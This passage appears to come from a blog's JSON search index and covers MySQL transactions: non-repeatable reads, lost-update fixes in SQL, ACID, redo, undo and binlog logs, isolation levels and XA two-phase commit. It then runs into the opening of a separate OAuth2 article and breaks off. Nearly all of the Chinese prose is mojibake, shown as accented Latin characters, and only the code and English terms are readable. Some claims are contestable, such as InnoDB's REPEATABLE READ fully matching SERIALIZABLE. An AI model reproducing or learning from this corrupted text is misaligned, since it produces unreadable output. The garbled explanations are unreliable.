ä¸å¯é‡å¤è¯»\n\nä¸å¯é‡å¤è¯»æ˜¯æŒ‡åœ¨ä¸€ä¸ªäº‹åŠ¡å†…å¤šæ¬¡è¯»å–åŒä¸€æ•°æ®é›†åˆã€‚åœ¨è¿™ä¸ªäº‹åŠ¡è¿˜æ²¡æœ‰ç»“æŸæ—¶ï¼Œå¦å¤–ä¸€ä¸ªäº‹åŠ¡ä¹Ÿè®¿é—®è¯¥åŒä¸€æ•°æ®é›†åˆï¼Œå¹¶åšäº†ä¸€äº›DMLæ“ä½œã€‚\n\nåœ¨ç¬¬ä¸€ä¸ªäº‹åŠ¡ä¸­çš„ä¸¤æ¬¡è¯»æ•°æ®ä¹‹é—´ï¼Œç”±äºç¬¬äºŒä¸ªäº‹åŠ¡çš„ä¿®æ”¹ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªäº‹åŠ¡ä¸¤æ¬¡è¯»åˆ°çš„æ•°æ®å¯èƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚è¿™æ ·å°±å‘ç”Ÿäº†åœ¨ä¸€ä¸ªäº‹åŠ¡å†…ä¸¤æ¬¡è¯»åˆ°çš„æ•°æ®æ˜¯ä¸ä¸€æ ·çš„æƒ…å†µï¼Œè¿™ç§æƒ…å†µç§°ä¸ºä¸å¯é‡å¤è¯»ã€‚å…¶è¿åäº†æ•°æ®åº“äº‹åŠ¡ä¸€è‡´æ€§çš„è¦æ±‚ã€‚\n\n\n\nä¸å¯é‡å¤è¯»å’Œè„è¯»çš„åŒºåˆ«æ˜¯ï¼šè„è¯»æ˜¯è¯»åˆ°æœªæäº¤çš„æ•°æ®ï¼Œè€Œä¸å¯é‡å¤è¯»è¯»åˆ°çš„å´æ˜¯å·²ç»æäº¤çš„æ•°æ®ï¼ˆæäº¤æ˜¯æŒ‡åˆ«çš„äº‹åŠ¡ commitï¼‰ã€‚\n\n\n\nåœ¨ InnoDB å­˜å‚¨å¼•æ“ä¸­ï¼Œé€šè¿‡ä½¿ç”¨ Next-Key Lock ç®—æ³•æ¥é¿å…ä¸å¯é‡å¤è¯»çš„é—®é¢˜ã€‚åœ¨ MySQL å®˜æ–¹æ–‡æ¡£ä¸­å°†ä¸å¯é‡å¤è¯»çš„é—®é¢˜å®šä¹‰ä¸º Phantom Problemï¼Œå³å¹»åƒé—®é¢˜ã€‚\n\nåœ¨ Next-Key Lock ç®—æ³•ä¸‹ï¼Œå¯¹äºç´¢å¼•çš„æ‰«æï¼Œä¸ä»…æ˜¯é”ä½æ‰«æåˆ°çš„ç´¢å¼•ï¼Œè€Œä¸”è¿˜é”ä½è¿™äº›ç´¢å¼•è¦†ç›–çš„èŒƒå›´ï¼ˆgapï¼‰ã€‚å› æ­¤åœ¨è¿™ä¸ªèŒƒå›´å†…çš„æ’å…¥éƒ½æ˜¯ä¸å…è®¸çš„ã€‚è¿™æ ·å°±é¿å…äº†å¦å¤–çš„äº‹åŠ¡åœ¨è¿™ä¸ªèŒƒå›´å†…æ’å…¥æ•°æ®å¯¼è‡´çš„ä¸å¯é‡å¤è¯»çš„é—®é¢˜ã€‚\n\nå› æ­¤ï¼ŒInnoDBå­˜å‚¨å¼•æ“çš„é»˜è®¤äº‹åŠ¡éš”ç¦»çº§åˆ«æ˜¯READ REPEATABLEï¼Œé‡‡ç”¨Next-Key Lockç®—æ³•ï¼Œé¿å…äº†ä¸å¯é‡å¤è¯»çš„ç°è±¡ã€‚\n\n### 4.3 ä¸¢å¤±æ›´æ–°\n\nmysqlä¸¢å¤±æ›´æ–°é—®é¢˜è‹±æ–‡å«lost updateã€‚æŒ‡çš„æ˜¯ä¸¤ä¸ªäº‹åŠ¡åŒæ—¶æ›´æ–°ä¸€æ¡æ•°æ®ï¼Œåæ›´æ–°çš„è¦†ç›–äº†å‰é¢æ›´æ–°çš„ç»“æœï¼Œä»ç»“æœä¸Šçœ‹ç¬¬ä¸€æ¬¡çš„æ›´æ–°ä¸¢å¤±äº†çš„ç°è±¡ã€‚è„è¯»ï¼Œå¹»è¯»ï¼Œä¸å¯é‡å¤è¯»æ˜¯è¯»çš„é—®é¢˜ï¼Œä¸¢å¤±æ›´æ–°æ˜¯å†™çš„é—®é¢˜ã€‚\n\nå…¶å®ç°åœ¨æ•°æ®åº“æœ¬èº«å¹¶æ²¡æœ‰ä¸¢å¤±æ›´æ–°çš„é—®é¢˜ï¼Œå› ä¸ºå½“ä¸€ä¸ªäº‹åŠ¡æ›´æ–°ä¸€æ¡è®°å½•æ—¶ï¼Œå°±ä¼šåŠ æ’ä»–é”ï¼Œå¦å¤–ä¸€ä¸ªçš„æ›´æ–°å°±ä¼šé˜»å¡ä½ã€‚æ‰€ä»¥ä¸¢å¤±æ›´æ–°å¤§å¤šæ˜¯ä¸šåŠ¡æœ¬èº«çš„é—®é¢˜ã€‚\n\n\n\n+ æ‚²è§‚é”è§£å†³\n\n```sql\nbegin;\n// æ‰€æœ‰çš„ä¼šè¯éƒ½å¹¶å‘æ‰§è¡Œè¿™ä¸ªSQLï¼Œåªæœ‰ä¸€ä¸ªå¯ä»¥è·å– X é”æˆåŠŸï¼Œå…¶ä»–çš„éƒ½ç­‰å¾…\nselect id, name, balance from account where id = 1 for update;\n// å‡è®¾è¿”å›ï¼šbalance = 100;\n\n// åº”ç”¨ä»£ç ï¼šbalance += 10;  balance = 110\nupdate account set balance = 110 where id = 1;\ncommit;\n```\n\n\n\n+ è°ƒæ•´æ›´æ–°ç­–ç•¥è§£å†³\n\n```sql\nbegin;\n// æ‰§è¡Œå¿«ç…§è¯»\nselect id, balance from account where id = 1;\n// è¿™ä¸ªæ•°æ®æœ‰å¯èƒ½ä¼šè¢«å…¶ä»–çš„å¹¶å‘æ›´æ–°ç»™ä¿®æ”¹æ‰ï¼Œä¸ä¸€å®šæ˜¯æœ€æ–°çš„æ•°æ®\n\n// æ‰§è¡Œupdateæ“ä½œï¼Œæ³¨æ„è¿™é‡Œçš„ä¸åŒï¼Œæ˜¯ç›´æ¥å¯¹ä½™é¢åš å¢/å‡ æ“ä½œï¼Œ\n//  åˆ©ç”¨ä¸€è‡´æ€§è¯»è§†å›¾åœ¨updateæ—¶æ‰§è¡Œå½“å‰è¯»çš„ç‰¹ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæœ‰å¤šä¸ªä¼šè¯æ‰§è¡Œ updateï¼Œå…¶ä½™çš„ä¼šè¢«é˜»å¡\nupdate account set balance = balance + 10 where id = 1;\ncommit;\n```\n\n# 5. mysqlçš„äº‹åŠ¡\n\nInnoDBå­˜å‚¨å¼•æ“ä¸­çš„äº‹åŠ¡å®Œå…¨ç¬¦åˆACIDçš„ç‰¹æ€§ã€‚ACIDæ˜¯ä»¥ä¸‹4ä¸ªè¯çš„ç¼©å†™ï¼š\n\n+ åŸå­æ€§ï¼ˆatomicityï¼‰\n\n+ ä¸€è‡´æ€§ï¼ˆconsistencyï¼‰ \n\n+ éš”ç¦»æ€§ï¼ˆisolationï¼‰  // é”ä¸»è¦è§£å†³çš„é—®é¢˜\n\n+ æŒä¹…æ€§ï¼ˆdurability)\n\n### 5.1 äº‹åŠ¡åˆ†ç±»\n\nå¯¹äºInnoDBå­˜å‚¨å¼•æ“æ¥è¯´ï¼Œå…¶æ”¯æŒæ‰å¹³äº‹åŠ¡ã€å¸¦æœ‰ä¿å­˜ç‚¹çš„äº‹åŠ¡ã€é“¾äº‹åŠ¡ã€åˆ†å¸ƒå¼äº‹åŠ¡ã€‚\n\n+ æ‰å¹³äº‹åŠ¡ï¼ˆFlat Transactionï¼‰æ˜¯äº‹åŠ¡ç±»å‹ä¸­æœ€ç®€å•çš„ä¸€ç§ï¼Œä½†åœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¿™å¯èƒ½æ˜¯ä½¿ç”¨æœ€ä¸ºé¢‘ç¹çš„äº‹åŠ¡ã€‚åœ¨æ‰å¹³äº‹åŠ¡ä¸­ï¼Œæ‰€æœ‰æ“ä½œéƒ½å¤„äºåŒä¸€å±‚æ¬¡ï¼Œå…¶ç”±BEGIN WORKå¼€å§‹ï¼Œç”±COMMIT WORKæˆ–ROLLBACK WORKç»“æŸï¼Œå…¶é—´çš„æ“ä½œæ˜¯åŸå­çš„ï¼Œè¦ä¹ˆéƒ½æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½å›æ»šã€‚\n+ åˆ†å¸ƒå¼äº‹åŠ¡ï¼ˆDistributed Transactionsï¼‰é€šå¸¸æ˜¯ä¸€ä¸ªåœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹è¿è¡Œçš„æ‰å¹³äº‹åŠ¡ï¼Œå› æ­¤éœ€è¦æ ¹æ®æ•°æ®æ‰€åœ¨ä½ç½®è®¿é—®ç½‘ç»œä¸­çš„ä¸åŒèŠ‚ç‚¹ã€‚èŠ‚ç‚¹Aä¸èƒ½é€šè¿‡è°ƒç”¨ä¸€å°æ•°æ®åº“å°±å®Œæˆä»»åŠ¡ã€‚å…¶éœ€è¦è®¿é—®ç½‘ç»œä¸­ä¸¤ä¸ªèŠ‚ç‚¹çš„æ•°æ®åº“ï¼Œè€Œåœ¨æ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®åº“æ‰§è¡Œçš„äº‹åŠ¡æ“ä½œåˆéƒ½æ˜¯æ‰å¹³çš„ã€‚å¯¹äºåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå…¶åŒæ ·éœ€è¦æ»¡è¶³ACIDç‰¹æ€§ï¼Œè¦ä¹ˆéƒ½å‘ç”Ÿï¼Œè¦ä¹ˆéƒ½å¤±æ•ˆã€‚\n\n### 5.2 äº‹åŠ¡çš„å®ç°\n\näº‹åŠ¡éš”ç¦»æ€§ç”±é”æ¥å®ç°ã€‚åŸå­æ€§ã€ä¸€è‡´æ€§ã€æŒä¹…æ€§é€šè¿‡æ•°æ®åº“çš„redo logå’Œundo logæ¥å®Œæˆã€‚**redo logç§°ä¸ºé‡åšæ—¥å¿—ï¼Œç”¨æ¥ä¿è¯äº‹åŠ¡çš„åŸå­æ€§å’ŒæŒä¹…æ€§ã€‚undo logç”¨æ¥ä¿è¯äº‹åŠ¡çš„ä¸€è‡´æ€§ã€‚ï¼ˆmvccï¼‰**\n\næœ‰çš„DBAæˆ–è®¸ä¼šè®¤ä¸ºundoæ˜¯redoçš„é€†è¿‡ç¨‹ï¼Œå…¶å®ä¸ç„¶ã€‚redoå’Œundoçš„ä½œç”¨éƒ½å¯ä»¥è§†ä¸ºæ˜¯ä¸€ç§æ¢å¤æ“ä½œï¼Œredoæ¢å¤æäº¤äº‹åŠ¡ä¿®æ”¹çš„é¡µæ“ä½œï¼Œè€Œundoå›æ»šè¡Œè®°å½•åˆ°æŸä¸ªç‰¹å®šç‰ˆæœ¬ã€‚å› æ­¤ä¸¤è€…è®°å½•çš„å†…å®¹ä¸åŒï¼Œredoé€šå¸¸æ˜¯ç‰©ç†æ—¥å¿—ï¼Œè®°å½•çš„æ˜¯é¡µçš„ç‰©ç†ä¿®æ”¹æ“ä½œã€‚undoæ˜¯é€»è¾‘æ—¥å¿—ï¼Œæ ¹æ®æ¯è¡Œè®°å½•è¿›è¡Œè®°å½•ã€‚\n\n### 5.3 redo log \n\n**redo log å’Œ undo logçš„åŒºåˆ«**\n\nredo logç”¨æ¥ä¿è¯äº‹åŠ¡çš„æŒä¹…æ€§ï¼Œundo logç”¨æ¥å¸®åŠ©äº‹åŠ¡å›æ»šåŠMVCCçš„åŠŸèƒ½ã€‚redo logåŸºæœ¬ä¸Šéƒ½æ˜¯é¡ºåºå†™çš„ï¼Œåœ¨æ•°æ®åº“è¿è¡Œæ—¶ä¸éœ€è¦å¯¹redo logçš„æ–‡ä»¶è¿›è¡Œè¯»å–æ“ä½œã€‚è€Œundo logæ˜¯éœ€è¦è¿›è¡Œéšæœºè¯»å†™çš„ã€‚\n\n**redo log å’Œ bin logçš„åŒºåˆ«**\n\nMySQLæ•°æ®åº“ä¸­è¿˜æœ‰ä¸€ç§äºŒè¿›åˆ¶æ—¥å¿—ï¼ˆbinlogï¼‰ï¼Œå…¶ç”¨æ¥è¿›è¡ŒPOINT-IN-TIMEï¼ˆPITï¼‰çš„æ¢å¤åŠä¸»ä»å¤åˆ¶ï¼ˆReplicationï¼‰ç¯å¢ƒçš„å»ºç«‹ã€‚ä»è¡¨é¢ä¸Šçœ‹å…¶å’Œé‡åšæ—¥å¿—éå¸¸ç›¸ä¼¼ï¼Œéƒ½æ˜¯è®°å½•äº†å¯¹äºæ•°æ®åº“æ“ä½œçš„æ—¥å¿—ã€‚ç„¶è€Œï¼Œä»æœ¬è´¨ä¸Šæ¥çœ‹ï¼Œä¸¤è€…æœ‰ç€éå¸¸å¤§çš„ä¸åŒã€‚\n\né¦–å…ˆï¼Œé‡åšæ—¥å¿—æ˜¯åœ¨InnoDBå­˜å‚¨å¼•æ“å±‚äº§ç”Ÿï¼Œè€ŒäºŒè¿›åˆ¶æ—¥å¿—æ˜¯åœ¨MySQLæ•°æ®åº“çš„ä¸Šå±‚äº§ç”Ÿçš„ï¼Œå¹¶ä¸”äºŒè¿›åˆ¶æ—¥å¿—ä¸ä»…ä»…é’ˆå¯¹äºInnoDBå­˜å‚¨å¼•æ“ï¼ŒMySQLæ•°æ®åº“ä¸­çš„ä»»ä½•å­˜å‚¨å¼•æ“å¯¹äºæ•°æ®åº“çš„æ›´æ”¹éƒ½ä¼šäº§ç”ŸäºŒè¿›åˆ¶æ—¥å¿—ã€‚\n\nå…¶æ¬¡ï¼Œä¸¤ç§æ—¥å¿—è®°å½•çš„å†…å®¹å½¢å¼ä¸åŒã€‚MySQLæ•°æ®åº“ä¸Šå±‚çš„äºŒè¿›åˆ¶æ—¥å¿—æ˜¯ä¸€ç§é€»è¾‘æ—¥å¿—ï¼Œå…¶è®°å½•çš„æ˜¯å¯¹åº”çš„SQLè¯­å¥ã€‚è€ŒInnoDBå­˜å‚¨å¼•æ“å±‚é¢çš„é‡åšæ—¥å¿—æ˜¯ç‰©ç†æ ¼å¼æ—¥å¿—ï¼Œå…¶è®°å½•çš„æ˜¯å¯¹äºæ¯ä¸ªé¡µçš„ä¿®æ”¹ã€‚\n\n**æ¢å¤**\n\nInnoDBå­˜å‚¨å¼•æ“åœ¨å¯åŠ¨æ—¶ä¸ç®¡ä¸Šæ¬¡æ•°æ®åº“è¿è¡Œæ—¶æ˜¯å¦æ­£å¸¸å…³é—­ï¼Œéƒ½ä¼šå°è¯•è¿›è¡Œæ¢å¤æ“ä½œã€‚å› ä¸ºé‡åšæ—¥å¿—è®°å½•çš„æ˜¯ç‰©ç†æ—¥å¿—ï¼Œå› æ­¤æ¢å¤çš„é€Ÿåº¦æ¯”é€»è¾‘æ—¥å¿—ï¼Œå¦‚äºŒè¿›åˆ¶æ—¥å¿—ï¼Œè¦å¿«å¾ˆå¤šã€‚\n\nINSERTæ“ä½œåœ¨äºŒè¿›åˆ¶æ—¥å¿—ä¸­å°±ä¸æ˜¯å¹‚ç­‰çš„ï¼Œé‡å¤æ‰§è¡Œå¯èƒ½ä¼šæ’å…¥å¤šæ¡é‡å¤çš„è®°å½•ã€‚è€Œä¸Šè¿°INSERTæ“ä½œçš„é‡åšæ—¥å¿—æ˜¯å¹‚ç­‰çš„ã€‚\n\n\n\n### 5.4 undo log\n\nç”¨æˆ·é€šå¸¸å¯¹undoæœ‰è¿™æ ·çš„è¯¯è§£ï¼šundoç”¨äºå°†æ•°æ®åº“ç‰©ç†åœ°æ¢å¤åˆ°æ‰§è¡Œè¯­å¥æˆ–äº‹åŠ¡ä¹‹å‰çš„æ ·å­â€”â€”ä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚\n\nç”¨æˆ·æ‰§è¡Œäº†ä¸€ä¸ªINSERT 10Wæ¡è®°å½•çš„äº‹åŠ¡ï¼Œè¿™ä¸ªäº‹åŠ¡ä¼šå¯¼è‡´åˆ†é…ä¸€ä¸ªæ–°çš„æ®µï¼Œå³è¡¨ç©ºé—´ä¼šå¢å¤§ã€‚åœ¨ç”¨æˆ·æ‰§è¡ŒROLLBACKæ—¶ï¼Œä¼šå°†æ’å…¥çš„äº‹åŠ¡è¿›è¡Œå›æ»šï¼Œä½†æ˜¯è¡¨ç©ºé—´çš„å¤§å°å¹¶ä¸ä¼šå› æ­¤è€Œæ”¶ç¼©ã€‚å› æ­¤ï¼Œå½“InnoDBå­˜å‚¨å¼•æ“å›æ»šæ—¶ï¼Œå®ƒå®é™…ä¸Šåšçš„æ˜¯ä¸å…ˆå‰ç›¸åçš„å·¥ä½œã€‚å¯¹äºæ¯ä¸ªINSERTï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šå®Œæˆä¸€ä¸ªDELETEï¼›å¯¹äºæ¯ä¸ªDELETEï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šæ‰§è¡Œä¸€ä¸ªINSERTï¼›å¯¹äºæ¯ä¸ªUPDATEï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šæ‰§è¡Œä¸€ä¸ªç›¸åçš„UPDATEï¼Œå°†ä¿®æ”¹å‰çš„è¡Œæ”¾å›å»ã€‚\n\né™¤äº†å›æ»šæ“ä½œï¼Œundoçš„å¦ä¸€ä¸ªä½œç”¨æ˜¯MVCCï¼Œå³åœ¨InnoDBå­˜å‚¨å¼•æ“ä¸­MVCCçš„å®ç°æ˜¯é€šè¿‡undoæ¥å®Œæˆã€‚å½“ç”¨æˆ·è¯»å–ä¸€è¡Œè®°å½•æ—¶ï¼Œè‹¥è¯¥è®°å½•å·²ç»è¢«å…¶ä»–äº‹åŠ¡å ç”¨ï¼Œå½“å‰äº‹åŠ¡å¯ä»¥é€šè¿‡undoè¯»å–ä¹‹å‰çš„è¡Œç‰ˆæœ¬ä¿¡æ¯ï¼Œä»¥æ­¤å®ç°éé”å®šè¯»å–ã€‚\n\næœ€åä¹Ÿæ˜¯æœ€ä¸ºé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œundo logä¼šäº§ç”Ÿredo logï¼Œä¹Ÿå°±æ˜¯undo logçš„äº§ç”Ÿä¼šä¼´éšç€redo logçš„äº§ç”Ÿï¼Œè¿™æ˜¯å› ä¸ºundo logä¹Ÿéœ€è¦æŒä¹…æ€§çš„ä¿æŠ¤ã€‚\n\n\n\n### 5.5 innodbäº‹åŠ¡éš”ç¦»çº§åˆ«\n\n| ç±»å‹                         | å¤‡æ³¨                                                         |\n| ---------------------------- | ------------------------------------------------------------ |\n| Read Uncommitted(RU)æœªæäº¤è¯» | ä¸åŠ é”                                                       |\n| Read Committed(RC)å·²æäº¤è¯»   | è§£å†³è„è¯»                                                     |\n| Repeatable Read(RR)å¯é‡å¤è¯»  | è§£å†³è„è¯»ï¼Œä¸å¯é‡å¤è¯»ï¼Œinnodb è¿˜è§£å†³äº†å¹»è¯»(å› ä¸ºé—´éš™é”ä¸è®©åˆ«äººæ’å…¥)ï¼Œé»˜è®¤çº§åˆ« |\n| Serializable(SE) ä¸²è¡ŒåŒ–      | selectéšå¼è½¬ä¸ºlock in share mode, ä¼šå’Œ update,delete äº’æ–¥  è§£å†³è„è¯», ä¸å¯é‡å¤è¯», å¹»è¯» |\n\nInnoDBå­˜å‚¨å¼•æ“é»˜è®¤æ”¯æŒçš„éš”ç¦»çº§åˆ«æ˜¯REPEATABLE READï¼Œä½†æ˜¯ä¸æ ‡å‡†SQLä¸åŒçš„æ˜¯ï¼ŒInnoDBå­˜å‚¨å¼•æ“åœ¨REPEATABLE READäº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹ï¼Œä½¿ç”¨Next-Key Locké”çš„ç®—æ³•ï¼Œå› æ­¤é¿å…å¹»è¯»çš„äº§ç”Ÿã€‚è¿™ä¸å…¶ä»–æ•°æ®åº“ç³»ç»Ÿï¼ˆå¦‚Microsoft SQL Serveræ•°æ®åº“ï¼‰æ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥è¯´ï¼ŒInnoDBå­˜å‚¨å¼•æ“åœ¨é»˜è®¤çš„REPEATABLE READçš„äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸‹å·²ç»èƒ½å®Œå…¨ä¿è¯äº‹åŠ¡çš„éš”ç¦»æ€§è¦æ±‚ï¼Œå³è¾¾åˆ°SQLæ ‡å‡†çš„SERIALIZABLEéš”ç¦»çº§åˆ«ã€‚\n\néš”ç¦»çº§åˆ«è¶Šä½ï¼Œäº‹åŠ¡è¯·æ±‚çš„é”è¶Šå°‘æˆ–ä¿æŒé”çš„æ—¶é—´å°±è¶ŠçŸ­ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¤§å¤šæ•°æ•°æ®åº“ç³»ç»Ÿé»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«æ˜¯READ COMMITTEDã€‚\n\n### 5.6 MySQLæ•°æ®åº“åˆ†å¸ƒå¼äº‹åŠ¡\n\nInnoDBå­˜å‚¨å¼•æ“æä¾›äº†å¯¹XAäº‹åŠ¡çš„æ”¯æŒï¼Œå¹¶é€šè¿‡XAäº‹åŠ¡æ¥æ”¯æŒåˆ†å¸ƒå¼äº‹åŠ¡çš„å®ç°ã€‚åœ¨ä½¿ç”¨åˆ†å¸ƒå¼äº‹åŠ¡æ—¶ï¼ŒInnoDBå­˜å‚¨å¼•æ“çš„äº‹åŠ¡éš”ç¦»çº§åˆ«å¿…é¡»è®¾ç½®ä¸ºSERIALIZABLEã€‚\n\nXAäº‹åŠ¡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªèµ„æºç®¡ç†å™¨ï¼ˆResource Managersï¼‰ã€ä¸€ä¸ªäº‹åŠ¡ç®¡ç†å™¨ï¼ˆTransaction Managerï¼‰ä»¥åŠä¸€ä¸ªåº”ç”¨ç¨‹åºï¼ˆApplication Programï¼‰ç»„æˆã€‚\n\n+ èµ„æºç®¡ç†å™¨ï¼šæä¾›è®¿é—®äº‹åŠ¡èµ„æºçš„æ–¹æ³•ã€‚é€šå¸¸ä¸€ä¸ªæ•°æ®åº“å°±æ˜¯ä¸€ä¸ªèµ„æºç®¡ç†å™¨ã€‚\n+ äº‹åŠ¡ç®¡ç†å™¨ï¼šåè°ƒå‚ä¸å…¨å±€äº‹åŠ¡ä¸­çš„å„ä¸ªäº‹åŠ¡ã€‚éœ€è¦å’Œå‚ä¸å…¨å±€äº‹åŠ¡çš„æ‰€æœ‰èµ„æºç®¡ç†å™¨è¿›è¡Œé€šä¿¡ã€‚\n+ åº”ç”¨ç¨‹åºï¼šå®šä¹‰äº‹åŠ¡çš„è¾¹ç•Œï¼ŒæŒ‡å®šå…¨å±€äº‹åŠ¡ä¸­çš„æ“ä½œã€‚\n\nåœ¨MySQLæ•°æ®åº“çš„åˆ†å¸ƒå¼äº‹åŠ¡ä¸­ï¼Œèµ„æºç®¡ç†å™¨å°±æ˜¯MySQLæ•°æ®åº“ï¼Œäº‹åŠ¡ç®¡ç†å™¨ä¸ºè¿æ¥MySQLæœåŠ¡å™¨çš„å®¢æˆ·ç«¯ã€‚å›¾7-22æ˜¾ç¤ºäº†ä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡çš„æ¨¡å‹ã€‚\n\n<img src=\"mysqlçš„é”å’Œäº‹åŠ¡æœºåˆ¶/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\nåˆ†å¸ƒå¼äº‹åŠ¡ä½¿ç”¨ä¸¤æ®µå¼æäº¤ï¼ˆtwo-phase commitï¼‰çš„æ–¹å¼ã€‚\n\nåœ¨ç¬¬ä¸€é˜¶æ®µï¼Œæ‰€æœ‰å‚ä¸å…¨å±€äº‹åŠ¡çš„èŠ‚ç‚¹éƒ½å¼€å§‹å‡†å¤‡ï¼ˆPREPAREï¼‰ï¼Œå‘Šè¯‰äº‹åŠ¡ç®¡ç†å™¨å®ƒä»¬å‡†å¤‡å¥½æäº¤äº†ã€‚åœ¨ç¬¬äºŒé˜¶æ®µï¼Œäº‹åŠ¡ç®¡ç†å™¨å‘Šè¯‰èµ„æºç®¡ç†å™¨æ‰§è¡ŒROLLBACKè¿˜æ˜¯COMMITã€‚å¦‚æœä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹æ˜¾ç¤ºä¸èƒ½æäº¤ï¼Œåˆ™æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½è¢«å‘ŠçŸ¥éœ€è¦å›æ»šã€‚å¯è§ä¸æœ¬åœ°äº‹åŠ¡ä¸åŒçš„æ˜¯ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡éœ€è¦å¤šä¸€æ¬¡çš„PREPAREæ“ä½œï¼Œå¾…æ”¶åˆ°æ‰€æœ‰èŠ‚ç‚¹çš„åŒæ„ä¿¡æ¯åï¼Œå†è¿›è¡ŒCOMMITæˆ–æ˜¯ROLLBACKæ“ä½œã€‚\n\n**Mysqlå†…éƒ¨XAäº‹åŠ¡**\n\næœ€ä¸ºå¸¸è§çš„å†…éƒ¨XAäº‹åŠ¡å­˜åœ¨äºbinlogä¸InnoDBå­˜å‚¨å¼•æ“ä¹‹é—´ã€‚äºŒè¿›åˆ¶æ—¥å¿—å’Œé‡åšæ—¥å¿—å¿…é¡»åŒæ—¶å†™å…¥ã€‚è‹¥äºŒè¿›åˆ¶æ—¥å¿—å…ˆå†™äº†ï¼Œè€Œåœ¨å†™å…¥InnoDBå­˜å‚¨å¼•æ“æ—¶å‘ç”Ÿäº†å®•æœºï¼Œé‚£ä¹ˆslaveå¯èƒ½ä¼šæ¥æ”¶åˆ°masterä¼ è¿‡å»çš„äºŒè¿›åˆ¶æ—¥å¿—å¹¶æ‰§è¡Œï¼Œæœ€ç»ˆå¯¼è‡´äº†ä¸»ä»ä¸ä¸€è‡´çš„æƒ…å†µã€‚\n\n\n\nå½“äº‹åŠ¡æäº¤æ—¶ï¼ŒInnoDBå­˜å‚¨å¼•æ“ä¼šå…ˆåšä¸€ä¸ªPREPAREæ“ä½œï¼Œå°†äº‹åŠ¡çš„xidå†™å…¥ï¼Œæ¥ç€è¿›è¡ŒäºŒè¿›åˆ¶æ—¥å¿—çš„å†™å…¥ï¼Œå¦‚å›¾7-24æ‰€ç¤ºã€‚å¦‚æœåœ¨InnoDBå­˜å‚¨å¼•æ“æäº¤å‰ï¼ŒMySQLæ•°æ®åº“å®•æœºäº†ï¼Œé‚£ä¹ˆMySQLæ•°æ®åº“åœ¨é‡å¯åä¼šå…ˆæ£€æŸ¥å‡†å¤‡çš„UXIDäº‹åŠ¡æ˜¯å¦å·²ç»æäº¤ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™åœ¨å­˜å‚¨å¼•æ“å±‚å†è¿›è¡Œä¸€æ¬¡æäº¤æ“ä½œã€‚\n\n<img src=\"mysqlçš„é”å’Œäº‹åŠ¡æœºåˆ¶/4.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n# 6. å¤´è„‘é£æš´\n\n - è¡Œé”åŒ…æ‹¬å…±äº«é” (lock in share mode)ï¼Œæ’ä»–é”ï¼ˆfor updateï¼‰\n - æ„å‘é”ï¼Œå’Œå…¶ä»–é”å¯ä»¥å…±å­˜ã€‚æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè¡¨é”ã€‚\n - è¡Œé”ä¸‰ç§ç®—æ³•ï¼šè¡Œè®°å½•é”, é—´éš™é”ï¼Œnext-key é”ï¼ˆè¡Œ + é—´ï¼‰\n - è„è¯»æ˜¯è¯»åˆ°å…¶ä»–æœªæäº¤çš„æ•°æ®ã€‚ä¸å¯é‡å¤åº¦èƒ½è¯»åˆ°å…¶ä»–äº‹åŠ¡æäº¤çš„æ•°æ®ï¼ˆRR é€šè¿‡å¿«ç…§è¯»åˆ›å»ºä¸€æ¬¡è§£å†³ï¼‰ã€‚\n\n# 7. å‚è€ƒèµ„æ–™\n\n+ [MySQLäº‹åŠ¡å’Œé”æœºåˆ¶è¯¦è§£](https://www.bilibili.com/video/BV1x54y1979n?from=search&seid=4833652458207423339)\n+ https://www.zhihu.com/question/51513268/answer/127777478\n+ https://www.wencst.com/archives/1521\n+ ç´¢å¼• https://www.liuvv.com/p/84544518.html\n- é”å’Œäº‹åŠ¡ https://www.liuvv.com/p/9762ea3e.html\n- MVCC https://www.liuvv.com/p/a0f7945d.html\n\n","tags":["mysql"],"categories":["mysql"]},{"title":"OAuth2è®¤è¯æµç¨‹å’Œæˆæƒæ¨¡å¼","url":"%2Fp%2F4ce15f73.html","content":"\néšç€å¾®æœåŠ¡çš„å…´èµ·ï¼ŒOAuth2ä¹Ÿç«äº†èµ·æ¥ï¼Œç”±äºå…¶è‡ªèº«çš„ä¼˜åŠ¿ï¼Œä¿¨ç„¶å·²æˆä¸ºå¾®æœåŠ¡APIæœåŠ¡æ¥å£å®‰å…¨é˜²æŠ¤çš„é¦–é€‰ã€‚\n\n<!-- more -->\n\nä¾‹å¦‚æœ‰ä¸€ä¸ª\"äº‘å†²å°\"çš„ç½‘ç«™ï¼Œå¯ä»¥å°†ç”¨æˆ·å‚¨å­˜åœ¨Googleçš„ç…§ç‰‡ï¼Œå†²å°å‡ºæ¥ã€‚ç”¨æˆ·ä¸ºäº†ä½¿ç”¨è¯¥æœåŠ¡ï¼Œå¿…é¡»è®©\"äº‘å†²å°\"è¯»å–è‡ªå·±å‚¨å­˜åœ¨Googleä¸Šçš„ç…§ç‰‡ã€‚\n\n# 1. ä»‹ç»\n\nOAuth2ï¼ˆOpen Authorizationï¼Œå¼€æ”¾æˆæƒï¼‰æ˜¯OAuthçš„å‡çº§ç‰ˆæœ¬ã€‚OAuth æ˜¯ä¸€ä¸ªå¼€æ”¾æ 